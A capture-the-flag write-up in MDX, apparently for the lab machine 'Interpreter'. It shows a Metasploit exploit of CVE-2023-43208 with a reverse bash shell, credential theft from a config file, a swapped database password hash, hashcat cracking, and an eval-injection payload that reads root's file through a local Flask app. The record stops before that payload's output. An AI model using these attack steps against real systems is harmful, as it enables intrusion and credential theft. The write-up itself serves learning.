@@ -1,0 +1,142 @@
+import { Bild, Code, Block, Marker } from "../components.tsx"
+
+Starting off with a <Code content="nmap" /> scan reveals four open ports:
+
+<Block language="Bash" content={"22 - SSH\n80 - HTTP\n443 - HTTPS\n6661 - HTTP (Mirth Connect)"} />
+
+Browsing to port <Code content="80" /> reveals a login dashboard for Mirth Connect. To use the login form, I need to go to port <Code content="443" />. The page also provides a client download and a launcher file (<Code content="webstart.jnlp" />).
+
+<Bild
+    src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/interpreter-login.png"}
+    alt={"Mirth Connect login page"}
+    width={810}
+    height={579}
+/>
+
+Inspecting the jnlp-launcher file reveals interesting information. The target is running <Code content="Mirth Connect 4.4.0" />. Researching this version shows a public exploit: <Marker content="CVE-2023-43208" link="https://www.cve.org/CVERecord?id=CVE-2023-43208" /> for version prior to <Code content="4.4.1" />.
+
+<br />
+
+A Metasploit module exists, so inside <Code content="msfconsole" />, the module is loaded:
+
+<Block language="msfconsole" content={"msfconsole > use multi/http/mirth_connect_cve_2023_43208"} />
+
+After setting the target and payload:
+
+<Block
+    language="msfconsole"
+    content={"msfconsole > set RHOSTS interpreter.htb\nmsfconsole > set payload cmd/unix/reverse_bash\nmsfconsole > run"}
+/>
+
+One thing I experienced is that it is relevant which payload is in use. The exploit will work, and metasploit will report it as successful, but the a reverse shell is only established with certain payloads.
+
+Running the exploit with given payload will result in a reverse shell as the Mirth service user.
+
+<br />
+
+The shell is unstable, so it is upgraded:
+
+<Block language="Bash" content={"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm"} />
+
+This provides proper shell interaction.
+
+<br />
+
+The installation directory is located at <Code content="/usr/local/mirthconnect" />. Inside the <Code content="conf" /> directory, database credentials are listed in <Code content="mirth.properties" />. These credentials can be used to access the database <Code content="mc_bdd_prod" />.
+
+<Block language="Bash" content={"mysql -u mirthdb -p mc_bdd_prod"} />
+
+In the database are two relevant tables: <Code content="PERSONS" /> and <Code content="PERSON_PASSWORDS" /> The first one contains the user <Code content="sedric" /> and the second table contains the a base64-encoded hash for the password.
+
+<br />
+
+First thing I did was generate a new base64-encoded hash, that I know the password for, replace it in the database to get access to Mirth's dashboard. By default Mirth uses PBKDF2-HMAC-SHA256 for hashing the passwords, with a 8-byte salt and 600k iterations. I double-checked that by decoding the base64 hash from the database and counting the characters:
+
+<Block language="Bash" content={"echo 'u/+LBBOUnadiyFBsMOoIDPLbUmhrk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | wc -c"} />
+
+So I used the following Python code to generate my replacement:
+
+<Block
+    language="Python"
+    content={
+        'import os, base64, hashlib\n\npassword = b"SedricPass123!"\niterations = 600000\nsalt_len = 8\n\nsalt = os.urandom(salt_len)\ndk = hashlib.pbkdf2_hmac("sha256", password, salt, iterations,dklen=32)\nblob = base64.b64encode(salt + dk).decode()\n\nprint(blob)'
+    }
+/>
+
+This revealed me the whole Mirth dashboard, which didn't provide much more information.
+
+<Bild
+    src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/interpreter-mirth-dashboard.png"}
+    alt={"Mirth Connect dashboard"}
+    width={1920}
+    height={1040}
+/>
+
+With a slight nudge from an AI, I tried cracking the original base64 hash I had for <Code content="sedric" />'s password.
+
+<br />
+
+First I decoded the base64 hash, then I turned it into hex and split it into the salt and the derived key:
+
+<Block
+    language="Bash"
+    content={
+        "echo 'u/+LBBOUnadiyFBsMOoIDPLbUmhrk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd > blob.hex\nhead -c 16 blob.hex > salt.hex\ntail -c 64 blob.hex > hash.hex"
+    }
+/>
+
+This matches the structure of PBKDF2-HMAC-SHA256. The hash is reformatted for <Code content="hashcat" />:
+
+<Block language="Text" content={"sha256:600000:<SALT>:<KEY>"} />
+
+And cracked using mode <Code content="10900" />:
+
+<Block language="Bash" content={"hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt"} />
+
+After some time, the password is recovered. Because of the high number of iterations, it really was some time.
+
+<br />
+
+The recovered credentials work for SSH'ing into <Code content="sedric" />'s account, where the user flag was safely resting in the home directory.
+
+<br />
+
+Next step is privilege escalation. Enumeration begins with checking sudo permissions:
+
+<Block language="Bash" content={"sudo -l"} />
+
+Sudo is not recognized. Executing Linpeas was also not possible due to missing dependencies. So I had to do some manual enumeration. I checked, id, groups, content's I had access to, and then running processes. The last one was more or less a tip from a Writeup. The process list revealed a running instance of Python, which is executing a custom script called <Code content="notif.py" /> as root.
+
+<br />
+
+Inspecting that script revealed a Flask application, listening on port <Code content="54321" />. This app checks if it was requested on the machine, if not, it denies any request. If executed on the machine, it takes patient informations in form of XML data and writes it to a file.
+
+<br />
+
+This data is verified by this function:
+
+<Block
+    language="Python"
+    content={
+        'def template(first, last, sender, ts, dob, gender):\n\tpattern = re.compile(r"^[a-zA-Z0-9._\'\\"(){}=+/]+$")\n\tfor s in [first, last, sender, ts, dob, gender]:\n\t\tif not pattern.fullmatch(s):\n\t\t\treturn "[INVALID_INPUT]"\n\t# DOB format is DD/MM/YYYY\n\ttry:\n\t\tyear_of_birth = int(dob.split(\'/\')[-1])\n\t\tif year_of_birth < 1900 or year_of_birth > datetime.now().year:\n\t\t\treturn "[INVALID_DOB]"\n\texcept:\n\t\treturn "[INVALID_DOB]"\n\ttemplate = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"\n\ttry:\n\t\treturn eval(f"f\'\'\'{template}\'\'\'")\n\texcept Exception as e:\n\t\treturn f"[EVAL_ERROR] {e}"'
+    }
+/>
+
+The function checks the input for a regex pattern, then it checks if the date of birth is in a valid format and range. If the input passes these checks, it is used to create a template string, which is then evaluated using <Code content="eval" />. The eval screams privilege escalation vector.
+
+<br />
+
+To test out certain payloads, I redirected the flask app to my local machine using SSH:
+
+<Block language="Bash" content={"ssh -L 54321:localhost:54321 sedric@interpreter.htb"} />
+
+Then I used a simple payload to test if the eval can be abused for reading files, like the root flag. The request needs to have the correct information to pass the checks, needs to be passed to the endpoint <Code content="/addPatien" />, which checks the information via the function <Code content="template()" />. The payload I used looks like this:
+
+<Block
+    language="Bash"
+    content={
+        "curl -s -X POST http://127.0.0.1:54321/addPatient \\ \n-H 'Content-Type: application/xml' \\ \n--data\n'<patient>\n\t<firstname>{open('/root/root.txt').read()}</firstname>\n\t<lastname>a</lastname>\n\t<sender_app>a</sender_app>\n\t<timestamp>1</timestamp>\n\t<birth_date>01/01/2000</birth_date>\n\t<gender>M</gender>\n</patient>'"
+    }
+/>
+
+The output was satisfying:
